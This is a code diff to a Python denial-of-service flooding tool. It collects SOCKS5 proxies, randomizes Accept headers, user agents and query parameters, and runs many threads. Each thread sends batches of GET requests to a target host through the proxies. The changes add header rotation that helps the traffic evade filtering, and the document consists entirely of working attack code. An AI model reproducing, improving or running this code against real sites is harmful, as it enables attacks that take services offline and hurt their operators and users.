@@ -35,6 +35,24 @@ proxyResources = [
     'https://www.proxyscan.io/download?type=socks5',
 ]
 
+AcceptHeaders = [
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+        "Accept-Encoding: gzip, deflate\r\n",
+        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+        "Accept: text/html, application/xhtml+xml",
+        "Accept-Language: en-US,en;q=0.5\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
+]
+
 connectProxyHeader = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(targetHost)
 
 def socksCrawler():
@@ -80,41 +98,29 @@ def checkProxies():
         f.write(proxy)
     f.close()
 
-def Flood(indexPicker):
-    if indexPicker < len(proxies):
-        proxy = proxies[indexPicker].strip().split(":")
-    else:
-        proxy = rC(proxies).strip().split(":")
-    if indexPicker < len(userAgentList):
-        userAgent = userAgentList[indexPicker]
-    else:
-        userAgent = rC(userAgentList)
+def Flood():
+    valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
+    proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
-    Accept = "Accept: */*\r\n"
-    Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
-    X_Forwarded_For = "X-Forwarded-For: {}, {}\r\n".format(proxy[0], proxy[0][::-1])
-    User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
+    Accept = rC(AcceptHeaders)
+    User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
+    floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
+    floodHeader = floodHeader.encode()
     event.wait()
     while True:
         try:
-            socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
-            try:
-                for _ in range(100):
-                    valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
-                    floodHeader = "GET {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + Referer + X_Forwarded_For + User_Agent
-                    s.send(str(floodHeader).encode())
-                s.close()
-                print("Flood sent " + proxy[0] + ":" + proxy[1])
-            except:
-                s.close()
-        except:
+            s.connect((targetHost, targetPort))
+            for _ in range(100):
+                s.send(floodHeader)
             s.close()
+            print("Flood sent " + proxy[0] + ":" + proxy[1], end="\r")
+        except:
+            pass
 
 if "--socksCrawler" in sys.argv:
     socksCrawler()
@@ -138,8 +144,11 @@ for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
 for indexPicker in range(threadNumber):
-    thread = threading.Thread(target=Flood, args=(indexPicker, ))
-    thread.setDaemon = True
+    thread = threading.Thread(target=Flood, daemon=True)
     thread.start()
 
+time.sleep(1)
 event.set()
+
+while True:
+    input()
